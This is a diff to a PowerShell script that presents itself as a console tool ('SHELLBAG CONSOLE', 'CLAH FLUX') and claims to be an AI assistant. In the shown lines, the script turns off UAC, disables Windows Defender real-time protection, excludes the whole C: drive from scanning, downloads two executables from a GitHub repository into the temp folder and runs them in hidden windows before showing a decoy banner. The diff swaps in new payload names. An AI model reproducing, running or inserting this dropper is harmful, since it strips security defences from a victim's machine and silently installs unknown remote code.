@@ -5,26 +5,35 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Exit
 }
 
+
 Write-Host "STARTED "
+
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
 Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
+
 Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
+
 Write-Host "HI AM AI ASISTENT FLUX AI"
-$url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Svhost.exe"
-$url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Defender.exe"
-$path1 = "$env:TEMP\Svhost.exe"
-$path2 = "$env:TEMP\Defender.exe"
+$url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/winlogo.exe"
+$url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Client.exe"
+$path1 = "$env:TEMP\winlogo.exe"
+$path2 = "$env:TEMP\Client.exe"
+
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
 Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue
+
 Start-Process -FilePath $path1 -WindowStyle Hidden
 Start-Process -FilePath $path2 -WindowStyle Hidden
+
 Clear-Host
 $Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | MODULE"
+
 
 function Show-KRAKEH-Header {
     # Очищаем область заголовка
@@ -159,4 +168,3 @@ Remove-Item $path2 -Force -ErrorAction SilentlyContinue
 
 Write-Host "WELCOME" -ForegroundColor DarkGreen
 "WELCOME TO CLAH FLUX"
-sho on delaet?
